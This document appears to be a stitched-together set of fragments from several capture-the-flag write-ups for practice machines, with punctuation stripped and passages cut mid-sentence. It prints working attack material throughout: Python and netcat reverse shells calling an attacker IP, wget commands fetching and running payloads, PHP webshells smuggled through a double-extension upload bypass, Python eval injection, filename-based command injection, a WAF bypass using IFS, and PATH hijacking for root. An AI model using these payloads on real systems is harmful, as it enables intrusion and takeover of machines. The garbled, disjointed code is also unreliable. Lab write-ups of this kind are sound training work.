that allow to run javascript on a given website just by clicking on the bookmark icon Since the js is obfuscated lets open the Gitlab login page and run it onto the console to see what happen

password While checking network we can see that the password is 11des0081x So we have access to one developer Gitlab account Out of curiosity I tried to ssh with those credentials but without surprise it didnt worked Lets move on We have access to two repositories Deployer Profile Seeing by the name we can guess that deployer will be a kind of script to automatically deploy application to the web server Lets try to understand the inner working better deployer repository hold a single indexphp file The README file explain that its a webhook Reading through the documentation of gitlabhttpsdocsgitlabcomeeuserprojectintegrationswebhookshtml we can understand that a webhook is a function that will call a given url when a event occur on the repository In our case here we can guess that the repository is configured to call httpbitlabhtbdeployerindexphp when a action is made on the repository can be commit merge pull request etc Lets take a look at the indexphp to understand what action is made once its called php projectname event payloadeventtype state payloadobjectattributesstate branch payloadobjectattributestargetbranch if repoProfile branchmaster eventmergerequest statemerged echo shellexeccd profile sudo git pulln echo OKn This a rather simple script Judging from the if condition we understand that the script will cd into profile directory and then git pull to get the latest changes on every merged merge request Its our luck because we have control over the profile repository which is available through the Gitlab instance with our credentials That means that if we merge a file after amergerequest to the profile repository this said file will automatically be pulled on the server by the deployerindexphp webhook Thats the perfect scenario for a webshell dont you thin Through this Gitlab interface we can add a new file to our the profile repository it will be faster than cloning I used weevely to generate a php webshell bash

websitehttpsuserimagesgithubusercontentcom907674767158927c8915380f33e11e98c59cc2973c76cfdpng We have the source code and the documentation of the API That will surely be our entry point Out of curiosity I checked for exploit on Gogs and found CVE201818925 and CVE201820303 Gogs 01166 allows remote code execution because it does not properly validate session IDs as demonstrated by a sessionfile forgery in the file session provider in filego httpsnvdnistgovvulndetailCVE201818925 In pkgtoolpathgo in Gogs before 011821218 a directory traversal in the fileupload functionality can allow an attacker to create a file under datasessions on the server httpsnvdnistgovvulndetailCVE201820303 An exploit is also avaible GogsOwnzhttpsgithubcomTheZ3rogogsownz and allows to gain administrator rights and RCE on a GogsGitea server Unfortunately the footer of gogscrafthtb shows that the version used is not a vulnerable one 2018 Gogs Version 011860130 This confirms that our entry point will probably be the api Lets investigate Since we have the code source it will greatly help our investigation The API is in Python with the Flask framework Lets clone it to check the code more easily bash GITSSLNOVERIFYtrue git clone httpsgogscrafthtbCraftcraftapigit Remote code execution on API The first thing I do when doing static code analysis is checking if dangerous functions are used and can be used for command injection Its the easiest way to land a shell on a box If this search dont give any results I will move on to SQL injection and so on The most common way command injection vulnerability get introduced in Python is by the eval function which is used to run the python code which is passed as an argument within the program A quick grep will tell us if such function is used within the API bash grep ri eval craftapi craftapicraftapiapibrewendpointsbrewpy if evals 1 requestjsonabv We are lucky and just by the look of the line it seems like no sanitization is done and the abv request parameter is directly run through eval Reading through the code of brewpy confirm the suspicion python authauthrequired apiexpectbeerentry def postself Creates a new brew entry make sure the ABV value is sane if evals 1 requestjsonabv return ABV must be a decimal value less than 10 400 else createbrewrequestjson return None 201 Any Python code send in the request abv parameter will get interpreted Unfortunately authauthrequired inform us that we will first need a way to authenticate ourselves before being able to use this vulnerable endpoint Reading the documentation and the code source it doesnt seem there is any way to create a new account or use an already made token to authenticate to the API We need to find another way to authenticate Since we have access to the git repository we can try to exploit common flaw found in gitsvn repositories The most common issue is developers accidentally push API keys token or password to the repository There is a few good tools like truffleHoghttpsgithubcomdxa4481truffleHog or gitsecretshttpsgithubcomawslabsgitsecrets allows to automatically retrieve secrets and credentials accidentally committed Since there is only 6 commits in history we can manually review them to make sure we dont forget anything At commit a2d28ed155 we find an interesting cleanup Commit cleanuphttpsuserimagesgithubusercontentcom907674767160472668e1980f35111e98cb2f2f49bae0833png Lets try to use those credentials to authenticate to the API bash curl httpsapicrafthtbapiauthlogin k user

understanding the inner workings of the app is important python craftapiapiauthendpointsauthpy token requestheadersXCraftApiToken We have now all the needed information to perform our command injection Since we need to authenticate and perform multiple queries on the brew endpoint I decided to write a script to avoid writing a thousand curl request No need to start from scratch since craftapiteststestpy already provide a solid base I tweaked it a little to end up with this script python usrbinenv python import requests import json import urllib3

requestsposthttpsapicrafthtbapibrew headersheaders datajsondata verifyFalse Since eval will run any python code we will use this lambda function importospopenCMDread to run an os command from the python code I added a input so we simply have to type our command to run it on the API Shell style Unfortunately we dont have any output available so how are we going to know that our command executed successfully With timebased injection We are going to inject a sleep 5 command If the API hang for 5 seconds it means our command got executed successfully If the API respond immediately the injection failed Using the requests library elapsedtotalseconds function we can display the time elapsed for the request to success I add it to the script so we can easily see if the sleep 5 injection worked fine python printExecution time formatresponseelapsedtotalseconds Lets it give a try bash python testpy messageToken is valid test Execution time 0147798 sleep 5 Execution time 5158874 Looks like it worked fine Lets tweak our script a bit to be more confortable to use diff brewdictabv importospopenreadformatcmd brewdictabv importospopen sleep 3readformatcmd The usage of sleep 3 means that the sleep command will only get executed if the first command succeeded This technique will allow us to blindly learn about the box environment Here is an example to illustrate bash python testpy messageToken is valid curl help Execution time 0162407 wget help Execution time 3160078 Since wget help command took 3 seconds to execute this means that the command run fine While curl help failed the sleep 3 didnt start meaning curl is not probably not installed This little trick will allow us to have a valuable feedback to know if our command succeed or fail Lets try to open our classic reverse shell Start with our listener bash nc l vv p 8585 Listening on any address 8585 And launch our test script on the API bash python testpy messageToken is valid nc e binsh 10101085 8585 Execution time 0218422 nc help Execution time 4412322 Oddly enough this is not working whereas nc seems to be installed Thats strange but lets move on to a different type of reverse shell Since we know for sure that python is installed lets use a python reverse shell To make things easier lets launch a small http server to host our python reverse shell file bash cat hg8py import socketsubprocessos ssocketsocketsocketAFINETsocketSOCKSTREAM sconnect101010858585 osdup2sfileno0 osdup2sfileno1 osdup2sfileno2 psubprocesscallbinshi python m httpserver Serving HTTP on 0000 port 8000 http00008000 And back to our original terminal lets launch our injection bash python testpy messageToken is valid wget 101010858000hg8py O tmphg8py Execution time 115602 python tmphg8py And surely enough a connection open on our netcat listener bash nc l vv p 8585 Listening on any address 8585 Connection from 10101011057154 optapp id uid0root gid0root groups0root1bin2daemon3sys4adm6disk10wheel11floppy20dialout26tape27video Note Now that we are on the box we can investigate on why our original netcat command wasnt working The netcat version shipped in this box in a Busybox version The manual state optapp nc BusyBox v1293 20190124 074507 UTC multicall binary Usage nc OPTIONS HOST PORT connect nc OPTIONS l p PORT HOST PORT listen e PROG Run PROG after connect must be last In this version e option must be last So if we ran nc 10101085 8585 e binsh instead of nc e binsh 10101085 8585 the command would have succeeded perfectly I tried and it worked Odd but good to keep in mind for the future Pivot from docker container to user Now back to our topic We got our shell on the API Unfortunately as you noticed with the id command it seems like we are in a docker container From here we wont go far from here Our best bet might be to retrieve the API secrets to see if we can progress from here bash optappcraftapi cat settingspy Flask settings

are available on CyberArk websitehttpswwwcyberarkcomthreatresearchblogexecutethisiknowyouhaveit and gives us example on how to run this exploit First we need to write a NodeJS reserve shell I used the

Logstash root Looking around show that optkibana turn out to be empty etcelasticsearch still cant be accessed etclogstash belong to kibana group so we can read the content Lets dig As a reminder Logstash is a tool that collect various logs parses them and writes the parsed data to an Elasticsearch cluster Logstash part of the Elastic Stack integrates data from any source in any format with this flexible open source collection parsing and enrichment pipeline httpswwwelasticcofrproductslogstash Once reading the startupoptions file an information catch the eye bash cat etclogstashstartupoptions user and group id to be invoked as LSUSERlogstash LSGROUPlogstash LSUSERroot LSGROUProot So Logstash will run not as logstash user but as root user We are on the right track The confd folder contains three files According to its contents here what each file do inputconf tell Logstash where to search for logs filterconf filter what data is treated and what is ignored outputconf define what to do with parsed data Lets look first at inputconf and outputconf bash cat inputconf input file path optkibanalogstash startposition beginning sincedbpath devnull statinterval 10 second type execute mode read cat outputconf output if type execute stdout codec json exec command comando According to this config Logstash will every 10 seconds 1 Check for file named logstash in the optkibana folder path optkibanalogstash statinterval 10 second type execute mode read 2 Check the file content for data matching filters a regex defined in filterconf 3 Send the matched data to be executed in background json exec command comando Good it seems we can write any command in a file named optkibanalogstash and it should be run as root Neat But first we have to make sure the command match the filter to be parsed correctly by logstash Lets understand that filter bash cat filterconf filter if type execute grok match message EjecutarscomandossGREEDYDATAcomando Thats a complicated syntax at first look Logstash documentation present grok as Grok is a great way to parse unstructured log data into something structured and queryable So its a kind of regex Lets understand it step by step Ejecutarscomandoss is a simple regex meaning that the file have to begin with this sentence GREEDYDATAcomando is the interresting grok part According to the grok pattern sourcehttpsgithubcomlogstashpluginslogstashpatternscoreblobmasterpatternsgrokpatterns GREEDYDATA correspond to a in regex So basically when given the following line Ejecutar comando id grok will match the line and take the id part and parse it as commando variable to the Logstash output command comando as seen in outputconf Lets put all those informations together and try to get a root shell First as usual lets open a netcat listener bash nc l vv p 4485 Listening on any address 4485 assystdr Then create the file Logstash will take as input optkibanalogstash with the correct content matching the

binsystemctl Lets keep that in mind for the privilege escalation later Alright with all of that in mind lets investigate this simplerpy script to see how we can abuse it to pivot to the pepper user bash ls l total 8 rwxrr 1 pepper pepper 4587 Mar 4 2019 simplerpy The file is owned by pepper user and we have no right to edit it We will need to find a vulnerabiility in the script Upon opening it

an IP for i in forbidden if i in command printGot you exit ossystemping command ossystemping command clearly open a command injection vulnerability However the script author seems to be aware of the issue and blacklisted a few common characters used in command injection So we cant easily inject command But then what about command substitution According to the bash manual bash man bash Command

like gobuster did a good job since it already found each of those files Upon investigating the file we find that uploadphp is well a upload page It accepts only image and part of the code that check the validity of the sent file is written in libphp alongside various functions photosphp is used to display uploaded images First thing that come to mind here is to try to upload a php webshell through the uploadphp page Lets check the rules that validate if a file is valid or not php if checkfiletypeFILESmyFile filesizeFILESmyFiletmpname 60000 echo Invalid image file php function checkfiletypefile mimetype filemimetypefile if strposmimetype image 0 return true else return false The first check consist in a MIME typehttpsdevelopermozillaorgenUSdocsWebHTTPBasicsofHTTPMIMEtypes check of the file If the file MIME type doesnt contain image it will be defined as invalid This check means that the image will be validated locally so no request edition will help to smuggle a PHP Shell by editing ContentType header for example Scrolling through the code we notice a second check php validext arrayjpg png gif jpeg valid false foreach validext as vext if substrcomparemyFilename vext strlenvext 0 valid true This one check do compare the end of the filename to see if it end with the common jpg png gif and jpeg If not the file is defined invalid and not uploaded Alright with all those information in mind lets try to craft one malicious image File upload vulnerability Bypass First Check MIME Type The easiest way to do so is to take a valid image and append the malicious content at the end of the file It can be done in various way Here how I did bash Download most basic jpg image possible wget httpsrawgithubusercontentcommathiasbynenssmallmasterjpegjpg O hg8jpeg echo hg8jpeg cat hg82jpeg C Bypass Second Check File extension A common vulnerability in php file upload form is the double extension In Apache a php file might be executed using the double extension technique such as filephpjpg Unrestricted File UploadhttpswwwowasporgindexphpUnrestrictedFileUpload And thats exactly what we are going to do The second check will pass because our file extension will be jpg but the php code inside will still get executed bash mv hg8jpg hg8phpjpg We are ready to upload now Everything seems to went fine since we get the following message file uploaded refresh gallery The gallery is the photosphp endpoint Opening this page display a list of recently uploaded files and one with the phpjpg extension get the attention In the uploadphp file we got information

checkattackphp script every 3 minutes We dont have write access to the script so we are not able to edit it to inject command Since we have read access lets investigate to see if we can find a vulnerability in the runtime php value execrm f logpath execnohup binrm f pathvalue devnull 21 echo rm f pathvaluen mailto msg msg headers Fvalue Three exec calls we will surely find a way to inject something First exec execrm f logpath cant do anything since logpath is harcoded Second exec execnohup binrm f pathvalue devnull 21 is already more interesting Reading thought the code we understand that value is dynamically fetched from the filenames of files present in the varwwwhtmluploads folder For example with our previously uploaded image file hg8phpjpg the executed command will be php execnohup binrm f varwwwhtmluploadshg8phpjpg devnull 21 So if we are a file named for example sleep 5 here is what the executed command will be php execnohup binrm f varwwwhtmluploads sleep 5 devnull 21 Since we have write access to the varwwwhtmluploads folder lets try it out with a reverse shell Firstly lets open our listener bash On attacker console nc l vv p 8544 Listening on any address 8544

python execinfoformatpath As a reminded exechttpsdocspythonorg3libraryfunctionshtmlexec dynamically execute Python code passed as argument Like eval its usage is dangeroushttpsnedbatcheldercomblog201206evalreallyisdangeroushtml and open door to injections Lets see if we can use this flow to achieve remote code execution on the server Can we inject code in info

document selfserveDocrequestdoc DOCROOT def serveDocself path docRoot path urllibparseunquotepath As we could have have guess path is the url requested on the server and no sanitization is being made In the same way that SQL injection lets try to inject Python code that will lead to remote code injection on the server Lets create a simplified script with information we have python import os path inputCommand to execute info output Document printinfoformatpath So lets see what would happen if we pass an os command as path Lets try with ossystemsleep 5 bash python injectionpy Command to execute ossystemsleep 5 output Document ossystemsleep 5 This is not going to work we will need to escape the python command lets give it another try bash python injectionpy Command to execute ossystemsleep 5 output Document ossystemsleep 5 Looks good to me and doesnt throw error lets add the same eval than in the original to make sure the injection will work properly against the server python import os path ossystemsleep 5 info output Document execinfoformatpath And lets run it if it hang for 5 seconds then it mean our injection was successful bash time python injectionpy python tmppy 002s user 001s

What else do we have Lets see for checktxt and outtxt bash wwwdataobscurehomerobert cat checktxt Encrypting this file with your key should result in outtxt make sure your key is correct wwwdataobscurehomerobert cat outtxt v Thats interesting checktxt explain that encrypting this same file will result in outtxt with a given key We have both clear text message and its encrypted version Something also catch my eye Did you notice that the encrypted version contain the same number of characters and the same spaces placement than the clear text one We can say with confidence that the encryption mechanism seems to simply encrypt each letter one by one using the key somehow Lets see if we can find more informations and possibly retrieve the key If we find the key we can decipher the passwordremindertxt that will allow us to progress We didnt take a look at SuperSecureCryptpy its easy to guess that its the script used to encrypt those file This is the script python import sys import argparse def encrypttext key keylen lenkey keyPos 0 encrypted for x in text keyChr keykeyPos newChr ordx newChr chrnewChr ordkeyChr 255 encrypted newChr keyPos 1 keyPos keyPos keylen return

requiredFalse parseraddargumento metavarOutFile typestr helpWhere to output the encrypteddecrypted file requiredFalse parseraddargumentk metavarKey typestr helpKey to use requiredFalse Reading the argparse we can quickly understand whats this script will encrypt and decrypt a given file using a given key The function that interesting us is the encrypt function Why is it interesting Because we have a clear text file and its encrypted version passwordRemindertxt The encrypt function look like this python def encrypttext key keylen lenkey keyPos 0 encrypted for x in text keyChr keykeyPos newChr ordx newChr chrnewChr ordkeyChr 255 encrypted newChr keyPos 1 keyPos keyPos keylen return encrypted 12 lines taking it step by step we should have a good understanding of what it is doing Lets start The function take 2 arguments the text to encrypt and the secret key Nothing surprising yet Second third and fourth line respectively get the length of the key initialize keyPos to 0 which we can understand means key position and initialize the encrypted variable that will for sure hold the final encrypted content since its returned at the end of the function The for loop every character of the content to encrypt this tend to confirm our previous suspicions that the content is encrypted letterbyletter Inside the for loop the encrypt mechanism takes place keyChr keykeyPos get the secret key letter position For example if the secret password is hg8 then at the first loop keyChr will be h second loop it will be g and third loop 8 since keyPos get incremented by one at the end of the loop Then ord function is used on the letter to encrypt Python documentationhttpsdocspythonorg3libraryfunctionshtmlord explain Given a string representing one Unicode character return an integer representing the Unicode code point of that character For example orda returns the integer 97 and ord Euro sign returns 8364 This is the inverse of chrhttpsdocspythonorg3libraryfunctionshtmlchr chr Next line is where the Magic happens Lets break it down 1 newChr ordkeyChr The integer unicode code of the character to encrypt gets added to the integer unicode code of the current key character 2 newChr ordkeyChr 255 gets the remainder from the division of the keyChr addition by 255 to make sure it doesnt not exceed the Unicode code list 3 Finally we convert the result integer of the operation back to string using chr The encrypted character gets then added to the final encrypted variable with encrypted newChr The last two lines increments the key position so that the next characters to be encrypted will be encrypted from the next character of the secret key and so on keyPos keyPos keylen will restart the key position once we are at the end of the key For example with hg8 as a key this is what will happen when keyPos is 3 python keyPos keyPos keylen keyPos 3 3 keyPos 0 keyPos will be 0 since 3 divided by 3 gets 0 as remainder Alright This seems pretty clear now and not very robust encryption I am not going to describe the decrypt function since its exactly the same but inverted Lets now focus on how from an encrypted string and its cleartext equivalent we can find back the secret key used Recovering the secret key Seeing the encrypt logic its easy to understand how to get back the key from an clear string and its encrypted equivalent Clear character Key Character Encrypted Character Key Character Encrypted Character Clear character With that in mind we are going to write a little script to recover the secret key used to encrypt checktxt to outtxt To start we will input both clear and encrypted value python clear Encrypting this file with your key should result in outtxt make sure your key is correct encrypted v Here you need to be careful when copy pasting because space of the encrypted version are not usual spaces and could mess up your script if you paste it as normal spaces Here is how it should looks like in vim for example httpsuserimagesgithubusercontentcom907674772752623f6e331003bc211ea92b6a025983eb467png Here is the final script I made python def recoverkeyclear encrypt key positionclear 0 positionencrypt 0 for

checking the sudoer file for uncommon configuration bash sudo S l Matching Defaults entries for robert on obscure envreset mailbadpass securepathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinsnapbin User robert may run the following commands on obscure ALL NOPASSWD usrbinpython3 homerobertBetterSSHBetterSSHpy Interesting another homemade script And it can be run as sudo Sounds like a bad idea to me If we can find a flaw in this BetterSSHpy we will be able to escalate our privileges to root The python script is the following python import sys import random string import os import time import crypt

reading the code we can understand the main logic is the following 1 Get the user to input username and password python sessionuser inputEnter username passW inputEnter password 2 Open and parse the etcshadowhttpswwwtldporgLDPlameLAMElinuxadminmadeeasyshadowfileformatshtmlhttpswwwtldporgLDPlameLAMElinuxadminmadeeasyshadowfileformatshtml file to a temporary file in tmpSSH python path

to edit the script to display the retrieved root hash But of course it can not be that easy we dont have write rights since the file is owned by root bash robertobscureBetterSSH ls l total 4 rwxrxrx 1 root root 1805 Oct 5 1309 BetterSSHpy Then what The temporary file catch the attention aswell If we manage to read it before it get deleted we could retrieve root user password hash We are facing two issues here 1 The file name is random 2 The file get deleted immediately after creation The script allow no pause where we could read the file before it gets deleted At this point we will need to write a script monitoring the tmpSSH folder for any file creation and grab its content as fast as possible before it get deleted To do so I wrote a simple script python import os path tmpSSH before dictfile None for file in oslistdirpath while True after dictfile None for file in oslistdirpath added file for file in after if file not in before if added with openpath added0 r as newfile printnewfileread before after Basically the script will loop forever while listing file in tmpSSH if a new file is detected it will print its content Lets drop it on the server and give it a try bash robertobscure python3 tmpwatchsshpy In another shell lets run the betterSSHpy script bash robertobscure sudo usrbinpython3 homerobertBetterSSHBetterSSHpy Enter username hg8 Enter password hg8 Invalid

apache2mpmitkhttpmpmitksessenet module AssignUserID Takes two parameters uid and gid or really user name and group name use if you want to specify a raw uid specifies what uid and gid the vhost will run as after parsing the request etc of course So the virtualhost for varwwwinternal runs as joanna If we can find a Remote Code Execution command in the PHP code in this folder by abusing an eval or

uploadhttpsuserimagesgithubusercontentcom907674775481639aae6918059a311ea815475163f358616png Good we are on the right track to upload a webshell Unfortunately its not that simple the uploaded files gets deleted and configuration file reset every 1 minute or so making it impossible to use a webshell The good news is we do have an access to the server on ssh as bolt user here is how we can proceed 1 Create a reverse shell script with the bolt account on the server 2 Upload a php file calling this script This way we get a reverse that will be executed as wwwdata and will stay up even after the php file gets deleted Here is one way to do so First lets create the reverse shell script I will use Python one bash boltbolt cat tmphg8py python c import socketsubprocessosssocketsocketsocketAFINETsocketSOCKSTREAMsconnect101010108585osdup2sfileno0 osdup2sfileno1 osdup2sfileno2psubprocesscallbinshi boltbolt which python usrbinpython Now our php file calling this hg8py reverse shell bash hg8archbook echo hg8php Finally lets open our listener bash hg8archbook nc l vv p 8585 Listening on any address 8585 And lets redo the process edit the configuration to allow php upload upload the hg8php file and open it If everything goes fine and you have been fast enough the connection will open But it doesnt The connection just seem to hang The first thing that comes to mind is that a firewall is blocking any connection from the outside Since we have an access on the machine lets try to open our listener here instead bash boltbolt nc l vv p 8585 Listening on 0000 family 0 port 8585 Lets now recreate our python reverse shell with registry IP reupload and run our hg8php and bash boltbolt nc l vv p 8585 Listening on 0000 family 0 port 8585 Connection from localhost 48396 received id uid33wwwdata gid33wwwdata groups33wwwdata Alright we now have access to wwwdata account Thats a good progress Lets now try to find if and how we could escalate to root privilege While doing the usual recon for privilege escalation we stumble across with a command we have seem before bash boltbolt sudo l Matching Defaults entries for wwwdata on bolt envreset exemptgroupsudo mailbadpass securepathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinsnapbin User wwwdata may run the following commands on bolt root NOPASSWD usrbinrestic backup r rest If I recall correctly we saw restic command in the backupphp file in varwwwhtml bash boltboltvarwwwhtml cat varwwwhtmlbackupphp restic is a backup program that is fast efficient and secure It supports the three major operating systems httpsresticnet So we have a program that can be run as root manipulating files we can control Sounds like a perfect scenario for privilege escalation Lets decompose the restic command from backupphp to understand exactly whats its doing bash boltbolt restic help backup Create a new backup of files andor directories boltbolt restic backup help r repo string repository to backup to or restore from default RESTICREPOSITORY Alright so if we take this command as example bash restic backup r resthttpbackupregistryhtbbolt bolt restic is going to back up the bolt folder to the distant repository at httpbackupregistryhtb Looking around it seems we can not access nor do anything at httpbackupregistryhtb But anyway what lays here According to the restic documentation its the url of a restic repository Reading a bit more we can find a tool resticrestserverhttpsgithubcomresticrestserver Rest Server is a high performance HTTP server that implements restics REST backend API It provides secure and efficient way to backup data remotely using restic backup client via the rest URL httpsresticreadthedocsioenlatest030preparinganewrepohtmlrestserver Seeing this we can understand its what is being used on httpbackupregistryhtb With all those information in mind we can start to understand a plan to read files with escalated privileges 1 Setup a local restic backup server 2 Use the following command that wwwdata can run as sudo without password bash usrbinrestic backup r resthttpourresticrepolocal root 3 Navigate to the root folder that restic backup to grab the flag Its not yet a root shell but it should be good enough to grab the roottxt flag Alright so that was the idea lets see in practice now Restic privileged file read First thing first lets build the restic restserver binary bash hg8archbook git clone httpsgithubcomresticrestservergit cd restserver hg8archbook go run buildgo Lets now push the binary to the server bash hg8archbook scp i idrsa restserver boltregistryhtbtmp We can now check the documentation to understand how to run it bash boltbolttmp restserver help Run a REST server for use with restic Usage restserver flags Flags

stuck with Forbidden Seems like a WAF web application firewall is in place probably the why the box name is Wall When we send a simple test command like test the injection succeed Lets try to send a

Forbidden Forbidden You dont have permission to access centreonmaingetphp on this server Apache2429 Ubuntu Server at wallhtb Port 80 Injecting Done So now we have to find a solution to use command without spaces Searching a bit online we find that its possible to use the Internal field separatorhttpsenwikipediaorgwikiInternalfieldseparator The shell treats each character of IFS as a delimiter and splits the results of the other expansions into words on these characters Lets give it try bash echoIFStest Unfortunately this doesnt seems to work but using the brackets works bash echoIFStest test Lets try edit our exploit to replace spaces with the IFS diff command sysargv1 command commandreplace IFS This time we are going to open a local web server to have feedback on wether our command injection worked on not In a new terminal lets open a python simple http server bash python m httpserver Serving HTTP on 0000 port 8000 http00008000 And lets run our exploit again bash python

bit enabled first and this returned screen in version 450 As a reminder Binaries with the setuid bit enabled are being executed as if they were running under the context of the root user This enables normal nonprivileged users to use special privileges like opening sockets While this seems unnecessary for a normal user it is actually needed for simple commands like ping After a bit of search we stumbled upon a bughttpslistsgnuorgarchivehtmlscreendevel201701msg00025html that allows to privilege escalte to root with screen 450 and setuid bit set Lets give it a try bash On attacker side wget

command that caught the attention is runparts lsbsysinit etcupdatemotdd bash man runparts runparts runs all the executable files named within constraints described below found in directory directory Sounds promising If we can add a script to etcupdatemotdd it will be executed as root on next login Unfortunately we dont have writting rights to etcupdatemotdd nor to the file present in it bash jkrwriteup ls l etcupdatemotdd total 4 rwxrxrx 1 root root 23 Jun 3 2018 10uname That looks like a dead end here Another thing we noticed is that executable are called in relative path and not absolute And the first command gives the full PATH env variable before launching the runparts command bash sh c usrbinenv i PATHusrlocalsbinusrlocalbinusrsbinusrbinsbinbin runparts lsbsysinit etcupdatemotdd runmotddynamicnew As a reminder when a command is called Linux will search in the PATH environement variable to find where this executable is located So in the command above Linux system will first look in the usrlocalsbin to see if runparts is there then in usrlocalbin etc Lets check where runparts is bash jkrwriteup which runparts binrunparts So its bin folder the last on the PATH list That mean if we can write an executable named runparts in either usrlocalsbin usrlocalbin usrsbin usrbin sbin then it will be ran instead of the real binrunparts and as root If we have writting rights in any of those folder then its bingo Privilege escalation bash Bash reserve shell doesnt work lets use the python one jkrwriteup cat usrlocalsbinrunparts python c import
